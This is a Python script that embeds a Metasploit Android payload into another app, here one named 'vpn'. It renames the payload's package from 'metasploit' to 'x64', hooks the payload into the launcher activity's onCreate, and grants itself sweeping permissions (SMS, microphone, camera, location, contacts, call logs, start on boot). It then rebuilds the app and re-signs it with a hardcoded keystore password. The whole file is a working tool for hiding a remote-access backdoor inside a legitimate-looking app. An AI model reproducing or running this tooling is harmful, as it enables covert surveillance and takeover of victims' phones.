from pathlib import Path
from lxml import etree
import re
import os


if __name__ == '__main__':
	appName = 'vpn'
	os.system("apktool d venom.apk")
	os.system(f"apktool d {appName}.apk")
	os.mkdir(f'{appName}/smali/com/x64/')
	os.mkdir(f'{appName}/smali/com/x64/stage')
	path1 = Path('venom/smali/com/metasploit/stage')
	path2 = Path(f'{appName}/smali/com/x64/stage')
	for filename in path1.iterdir():
		with open(filename, 'r') as fp:
			data = fp.read()
			data = data.replace('metasploit', 'x64')
			with open(path2 / filename.name, 'w') as out:
				out.write(data)
	with open(f'{appName}/AndroidManifest.xml', 'rb') as fp:
		xml = fp.read()
	tree = etree.fromstring(xml)
	activities = tree.xpath('//activity')
	launcher = ''
	for activity in activities:
		if launcher != '':
			break
		try:
			if activity.xpath('intent-filter/action')[0].attrib.values()[0] == 'android.intent.action.MAIN':
				for key in activity.attrib.keys():
					if key[key.find('}')+1:] == 'name':
						launcher = activity.attrib[key]
						break
		except:
			pass

	path = f'{appName}/smali/' + '/'.join(launcher.split('.')) + '.smali'
	with open(path, 'r') as fp:
		Lines = fp.readlines()

	fp = open(path, 'w')
	for Line in Lines:
		fp.write(Line)
		if Line.find(';->onCreate(Landroid/os/Bundle;)V') > 0:
			fp.write('invoke-static {p0}, Lcom/x64/stage/Payload;->start(Landroid/content/Context;)V\n')
			pass
	fp.close()

	array = [
		"INTERNET",
		"ACCESS_WIFI_STATE",
		"CHANGE_WIFI_STATE",
		"ACCESS_NETWORK_STATE",
		"ACCESS_COARSE_LOCATION",
		"ACCESS_FINE_LOCATION",
		"READ_PHONE_STATE",
		"SEND_SMS",
		"RECEIVE_SMS",
		"RECORD_AUDIO",
		"CALL_PHONE",
		"READ_CONTACTS",
		"WRITE_CONTACTS",
		"RECORD_AUDIO",
		"WRITE_SETTINGS",
		"CAMERA",
		"READ_SMS",
		"WRITE_EXTERNAL_STORAGE",
		"RECEIVE_BOOT_COMPLETED",
		"SET_WALLPAPER",
		"READ_CALL_LOG",
		"WRITE_CALL_LOG",
		"WAKE_LOCK"
	]

	with open(f'{appName}/AndroidManifest.xml', 'r') as fp:
		Lines = fp.readlines()
	for Line in Lines:
		if 'android.permission' in Line:
			perm = re.findall(r'android\.permission\.([^"]+)', Line)[0]
			if perm not in array:
				array.append(perm)
	i = 0
	written = False
	fp = open(f'{appName}/AndroidManifest.xml', 'w')
	while i < len(Lines):
		if 'uses-permission' in Lines[i]:
			if not written:
				for perm in array:
					fp.write(f'\t<uses-permission android:name="android.permission.{perm}"/>\n')
				written = True
			i+=1
			continue
		fp.write(Lines[i])
		i+=1
	fp.close()
	os.system(f"apktool b {appName}")
	sign = f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore venom.keystore {appName}/dist/{appName}.apk venom -storepass "pwd2020"'
	os.system(sign)
